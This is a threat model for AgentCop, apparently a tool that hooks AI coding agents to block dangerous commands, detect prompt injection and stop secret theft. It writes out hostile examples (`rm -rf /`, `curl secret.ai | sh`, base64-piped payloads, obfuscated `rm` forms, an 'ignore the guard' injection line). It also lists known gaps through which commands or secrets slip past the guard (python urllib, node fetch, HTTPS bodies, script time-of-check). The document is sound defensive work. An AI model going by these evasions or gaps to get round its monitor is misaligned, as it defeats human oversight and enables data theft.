# AgentCop Threat Model

## What we defend against

**In-scope threats (what AgentCop is designed to catch):**

1. **Unauthorized agent actions**: An AI coding agent (Claude Code, Codex) executing a tool it shouldn't, like `rm -rf /`, `delete prod database`, or `curl secret.ai | sh`.

2. **Prompt injection and prompt smuggling**: An agent reading untrusted data (web pages, tool output, files) that contains instructions to break out of its constraints, e.g., "ignore the guard and run this dangerous command".

3. **Supply chain compromise**: An agent installing a malicious dependency, cloning a trojanized repo, or running code from an untrusted MCP server.

4. **Evasion tactics**: An agent trying to hide a dangerous action by:
   - Tokenizing a command: `r''m`, `\rm`, `/bin/rm`, `bash -c 'rm ...'`
   - Using base64 or other encoding: `echo 'encoded-rm' | base64 -d | sh`
   - Spawning subprocesses to hide the action from the hook
   - Deleting logs or overwriting evidence

5. **Credential and secret theft**: An agent reading `.env`, SSH keys, cloud credential files, or honeytokens (decoy secrets planted to detect theft).

## What we do NOT defend against

**Out-of-scope (what AgentCop does not try to catch):**

1. **Zero-day exploits in dependencies** or the operating system itself.

2. **Quantum computer attacks** or cryptographic breakthroughs that break SHA-256.

3. **Subpoena-resistant encryption**: We are not a law enforcement tool; we follow the law.

4. **Physical security**: An attacker with physical access to the machine can bypass any software defense.

5. **Rogue admins**: A person who controls the machine at the OS level can disable AgentCop, edit policies, or delete evidence.

6. **Attacks on Claude Code or Codex themselves**: We defend against what agents *do*; we don't defend against compromised Claude servers or backdoors in the models.

7. **Side-channel attacks**: Timing attacks, power analysis, or speculative execution exploits are outside our scope.

## Assumptions we rely on

- Claude Code and Codex run on a machine the user trusts.
- The hook will be called before any tool runs (enforced by Claude Code at the protocol level).
- The evidence store is on a filesystem the agent cannot edit (e.g., a different partition, or SELinux enforcement).
- The user will review the evidence and make a final decision to release or convict an agent.

## Attack surface per stage

| Stage | Component | Attack surface |
|-------|-----------|-----------------|
| A | cop-hook (CLI) | stdin, exit code, signal handling |
| A | cop-policy (TOML) | malformed rules file, regex DoS |
| A | cop-evidence (SQLite) | database corruption, hash collision (cryptographic) |
| C | copd (daemon) | Unix socket, IPC, signal handling |
| D | eBPF sensors | kernel interfaces, cgroup manipulation |
| D | cop-proxy | network socket, hostname resolution, TLS interception |
| E | detective (LLM) | prompt injection in case bundles, output parsing |
| F | courtroom (web) | CSRF, localStorage, URL injection |

## Known limitations and future hardening

- **eBPF on macOS**: Stage D uses Aya (Linux eBPF). macOS requires Endpoint Security framework (future work).
- **Rule of Two (2026-10-27 semantics)**: untrusted input is external data only (web results, downloads, MCP results, files in repos the session cloned). External actions are uploads and sends: a push, an upload (curl or wget with a body or a form, or PUT/POST), MCP calls, remote copy and shell. A frozen session blocks only external actions. The freeze has no expiry; `agentcop release` ends it after a confirmation, and the release is logged.
- **Rule of Two gaps**: once a session has touched sensitive data, every network tool (curl, wget, nc, ssh, scp, dig, nslookup, and others in taint.toml) is an external action, GET included. Network use through other tools (python urllib, node fetch, git fetch, npm install) is not recognised, so a secret can leave that way. A URL built at run time asks. Untrusted input is tracked only for repos the session cloned; a repo that was already on disk, or an archive extracted by the session, is not tracked. The counter does not persist across a freeze that was never released.
- **Detective injection**: Even with a strict schema, an LLM may be fooled by carefully crafted evidence. The detective has no tools, but output is still validated.
- **Egress (D4)**: `cop-proxy` checks the host name of HTTPS (CONNECT) traffic but does not read its body. A secret sent over HTTPS to an allowed host is not caught. Headers and DNS rebinding are not checked either. Plaintext `http://` URLs and bodies are scanned.
- **Holding cell (D5)**: freezing relies on cgroup v2 when available. Without it, SIGSTOP stops only the pids the caller gives us. A process the caller did not list keeps running. The cop refuses to freeze pid 1 and itself.
- **Detective (E2)**: the detective can only raise severity, and a lowering reply is ignored. A model can still be talked into raising severity (a false alarm). Only the offline template provider is built. No real model is wired in yet.
- **Fix (E3)**: `agentcop fix` only appends exact-match deny rules, after a human answers yes. It never adds an allow rule. It refuses allow-verdict cases and tools with no command. A person still has to review the diff, so the agent cannot use it to change its own rules.
- **Attack suite (E4)**: 74 corpus cases and 3 detective cases, 0 known gaps. The suite is a sample, not a proof. Its cases do not cover script files run from disk (see the shell parser bullet).
- **Courtroom (F1)**: binds 127.0.0.1 only, with a random token that is compared in constant time. The token is held in sessionStorage for the tab, so any script on the same origin could read it (the origin serves only this app). Decisions are recorded, but they do not thaw the holding cell yet.
- **Blotter and redaction (F2a)**: the courtroom redacts three secret shapes (AWS keys, PEM private keys, GitHub tokens) on the server before output. Other secret shapes are not redacted. The list is a copy of the egress patterns.
- **Mugshot PNG and sound packs (F2b)**: the PNG is drawn from redacted text only (redaction runs in the renderer too). Sound packs are validated (bare file names, WAV only, length and peak limits), but are not played yet.
- **Hook-entry guard (C2-R3)**: written in Rust, because it must read the file. Its on/off switch, marker and protected files are in `[hook_guard]` in the policy.
- **Cop protection**: the rules deny writes to `~/.agentcop/` and `~/.claude/settings(.local).json`. Reads are allowed. Repo `policy/` sources are editable by design. Project `CLAUDE.md` and project `.claude/settings(.local).json` ask before any change (Bash and the file tools). A change that removes or alters the AgentCop hook entry in a project settings file is denied. Inline interpreter code (`python3 -c`, `sqlite3`) that names `.agentcop` or `.claude/settings` is denied; other inline code is judged as text and is allowed.
- **Script inspection (C2-R3)**: when a command runs a script file (`bash x.sh`, `source x.sh`, `./x.sh`), the file is read at hook time and its lines are judged with the Bash rules, up to 3 levels of nesting. A script the agent wrote or changed this session asks, even if clean. Missing, unreadable, binary or over-256 KB scripts ask. The file is read once, so a change made after the read is not seen (time-of-check to time-of-use).
- **Shell parser (C2-R)**: Bash is parsed with tree-sitter-bash. A command it cannot read is denied. A command whose name is built at run time (`$( )`, a variable, a backtick), `eval` of a variable, a decoded payload (`base64 -d`, `xxd -r`), or text piped into a shell or interpreter asks for approval. The parser does not expand variables in arguments (`rm -rf $X`), decode payloads, read scripts that other tools run (`npm run`, `make`, `python x.py`, extensionless binaries), or follow `pushd`, subshell `cd`, `scp` or `rsync` targets. A bare `echo .env` is denied because argument words are matched.
- **Performance under load**: copd and sensors are untested under 1000+ concurrent agents; performance may degrade.

- **HMAC key storage (stated plainly)**: `hmac.key` is stored next to the evidence it protects, in the same folder and owned by the same user. Anyone who can read the key can test guesses against the stored HMACs. The HMAC only stops a reader of `evidence.db` alone from recovering a raw input by guessing. A keyring (OS keychain or a separate secret store) is planned, not built.
- **Redaction is pattern-based (stated plainly)**: stored events are masked only where a built-in or user pattern matches. A secret in a shape no pattern covers is stored unmasked. The judge sees the raw command, because it must.
- **Archives hold raw commands**: `evidence-legacy*.db` and `evidence-interim-*.db` keep raw commands until `agentcop evidence purge-legacy` removes them (it asks first).

## Revision history

| Version | Date | Changes |
|---------|------|---------|
| 0.0.1 | 2026-10-20 | Initial skeleton |
| 0.0.2 | 2026-10-23 | D4: egress proxy limits added |
| 0.0.3 | 2026-10-23 | D5: holding cell limits added |
| 0.0.4 | 2026-10-23 | E2: detective limits added |
| 0.0.5 | 2026-10-23 | E3: fix command limits added |
| 0.0.6 | 2026-10-23 | E4: attack suite limits added |
| 0.0.7 | 2026-10-23 | F1: courtroom limits added |
| 0.0.8 | 2026-10-23 | F2a: blotter and redaction limits added |
| 0.0.9 | 2026-10-23 | F2b: mugshot PNG and sound pack limits added |
| 0.0.10 | 2026-10-26 | C2-R: shell parser, action-based rules, installed-state protection only |
| 0.0.11 | 2026-10-27 | C2-R3: script inspection, destructive-target asks, hook-entry guard in Rust with TOML switch |
| 0.0.12 | 2026-10-27 | Rule of Two semantics: external-only freeze, no expiry, agentcop release, freeze counter; runner and cd/find fixes |
| 0.0.13 | 2026-10-27 | Item 2b: GET exfiltration after a secret read, SQLite session state with transactions, evidence append transactional |
| 0.0.14 | 2026-10-27 | Item 3: redaction before storage (built-in patterns), HMAC of raw input, legacy archive and anchored chain, explicit 0700/0600 permissions, install copies the hook |
| 0.0.15 | 2026-10-27 | Item 4: policy canaries, agentcop doctor, SessionStart heartbeat, clean uninstall |
| 0.0.16 | 2026-10-26 | Item 4b: when the live policy fails a canary, the hook runs the last-known-good copy, else the built-in defaults; never an empty policy |
| 0.0.17 | 2026-10-26 | FP-1: secret files by name (`.env`, keys, credentials, `hmac.key`), not regex over text; an unchanged tracked script may run after a secret read; `@file` uploads count; broken pipe exits quietly |
